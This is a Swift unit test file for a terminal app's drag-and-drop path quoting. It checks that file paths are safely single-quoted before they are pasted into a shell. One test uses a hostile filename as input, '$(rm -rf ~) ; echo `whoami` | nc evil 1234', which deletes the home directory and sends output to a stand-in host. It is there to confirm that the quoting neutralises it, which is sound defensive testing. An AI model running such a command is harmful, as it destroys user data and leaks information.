import XCTest
import AppKit
@testable import Blackbird

final class DragDropTests: XCTestCase {
    /// `shellQuote` wraps a path in single quotes and escapes embedded singles.
    func testShellQuoteSimple() {
        XCTAssertEqual(TerminalView.shellQuote("/Users/foo/bar.png"),
                       "'/Users/foo/bar.png'")
    }

    func testShellQuoteWithSpaces() {
        XCTAssertEqual(TerminalView.shellQuote("/Users/foo/my image.png"),
                       "'/Users/foo/my image.png'")
    }

    func testShellQuoteWithEmbeddedSingleQuote() {
        // Classic POSIX recipe: close quote, escaped single, reopen.
        XCTAssertEqual(TerminalView.shellQuote("/tmp/don't.txt"),
                       "'/tmp/don'\\''t.txt'")
    }

    func testJoinedMultiFile() {
        let joined = TerminalView.joinedDroppedPaths([
            "/a/one.png",
            "/b/two three.png",
        ])
        XCTAssertEqual(joined, "'/a/one.png' '/b/two three.png'")
    }

    func testShellQuoteRejectsShellMetachars() {
        // Filenames can technically contain backticks, dollar signs,
        // semicolons, pipes. Single-quote wrapping neutralises all of
        // them — test verifies the quoter doesn't collapse anything.
        let name = "$(rm -rf ~) ; echo `whoami` | nc evil 1234"
        let quoted = TerminalView.shellQuote(name)
        // Metachars pass through literally; the outer single quotes
        // turn them into plain characters for the shell.
        XCTAssertTrue(quoted.hasPrefix("'"))
        XCTAssertTrue(quoted.hasSuffix("'"))
        XCTAssertTrue(quoted.contains("$(rm -rf ~)"))
    }

    func testShellQuote_emptyString() {
        // An empty-string path (edge-case from misbehaving
        // NSPasteboard reader) becomes just `''` — harmless when
        // pasted into the shell as a positional arg.
        XCTAssertEqual(TerminalView.shellQuote(""), "''")
    }

    func testJoinedDroppedPaths_emptyArray() {
        XCTAssertEqual(TerminalView.joinedDroppedPaths([]), "")
    }

    func testJoinedDroppedPaths_singleFile() {
        XCTAssertEqual(
            TerminalView.joinedDroppedPaths(["/only/one.txt"]),
            "'/only/one.txt'"
        )
    }
}
